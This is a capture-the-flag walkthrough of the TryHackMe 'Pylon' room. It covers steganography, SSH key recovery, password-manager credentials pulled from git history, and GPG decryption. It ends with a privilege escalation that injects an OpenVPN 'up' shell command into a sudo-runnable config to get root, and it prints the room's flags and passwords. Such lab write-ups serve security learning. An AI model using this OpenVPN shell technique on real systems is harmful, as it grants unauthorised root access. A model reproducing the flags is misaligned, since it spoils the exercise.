# Tryhackme.com Room : Pylon
`https://tryhackme.com/room/pylon`

## Steg phase

We are provided with a `jpg` image.



running exiftool we find this url `https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)`

Which is a `cyberchef` recipe with `to hex` and `to base85`
Might be that we need to do `from hex` - `from base85` to decode the data ?

by running `stegcracker`, we find the `steghide` password `pepper` and a file named `lone` with the content :
```
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
```

The `base85` recipe kinda threw me in the wrong direction. after a while I decided to check a write up.
And apparently, this is just base64. The output is a `.gz` file which gives us a `.tar` file and finally a `private openssh` key.



## Initial foothold

Tried to  `ssh` into the box with the key but it didn't work.
Scanning the box with `nmap` shows a second `ssh` server running on port `222`.
We can login with this one using

```
ssh -i lone_id lone@10.10.152.103 -p 222
```

We are greeted with a prompt asking for an encryption key.
Soo, this was not straightforward. The hint mentioned
```
The encryption key is encoded, did you find the scheme? This user really loves his dog, try his dog's name.
```

I tried to base64 encode `pepper` but it didn't work.
Going back to the write up, they talk about the cyberchef recipe that we got earlier.
Using this recipe with the string `pepper` we get the key :

```
2_[-I2_[0E2DmEK
```

Not sure I would have thought about that...
Anywayss, now we got some menu :
```
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
```

When selecting `1` we get the first flag :
```
THM{homebrew_password_manager}  
```

And the credentials for the user `lone`:
```
Username = lone
Password = +2BRkRuE!w7>ozQ4
```

Using these credentials, we can connect on port `22` and we find `/home/lone/user1.txt` :
```
TMM{easy_does_it}
```



## Lateral movement

running `sudo -l` give us :

```
User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

We find the file `note_from_pood.gpg` but we need the key to decrypt it.



We have the source for `pylon` password manager in `/home/lone/pylon`.

It is a `git` repo, we look at the `git log` :

```
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

Looking through the commits, we see that we have a `pylon.db` file in the first commit.

When we execute `pylon` at this commit, we enter the same decoding key as before (`2_[-I2_[0E2DmEK`) and we find an entry for the `lone_gpg_key` :

```
Username = lone_gpg_key
Password = zr7R0T]6zvYl*~OD
```

We can then decrypt the `note_from_pood.gpg` file using `gpg --decrypt note_from_pood.gpg`

We get :

```
Hi Lone,

Can you please fix the openvpn config?
It's not behaving itself again.
oh, by the way, my password is yn0ouE9JLR3h)`=I

Thanks again.
```

hmmm the `openvpn` config... anyhow, le'ts `su pood`

We find `/home/pood/user2.txt` :

```
THM{homebrew_encryption_lol}
```



## Priv Esc

running `sudo -l` we get 

```
User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```



So `pood` can modify the config and `lone` can execute it

Getting a `root` shell is actually quite simple.

We simply add the following lines in the `/opt/openvpn/client.ovpn` file :

```
script-security 2
up '/bin/sh -c sh'
```

Then running `sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn` gives us a `root` shell.



Can't be that easy tho, the `/root/root.txt` is `gpg` encrypted, again..

Oh well, it is that easy. Simply running `gpg --decrypt /root/root.txt.gpg` gives us the flag. No passphrase required :

```
ThM{OpenVPN_script_pwn}
```





## Wrap up

* This was a bit of a convoluted box, especially the part where you have to use the cyberchef recipe to encode the word `pupper` in order to get the key for the password manager.
* Did learn some stuff tho, like when you decode `base64` and the output looks like gibberish, pipe it to a file and execute `file` on it to see if it's a known format. In this case it was a `.tar.gz` file.
* 

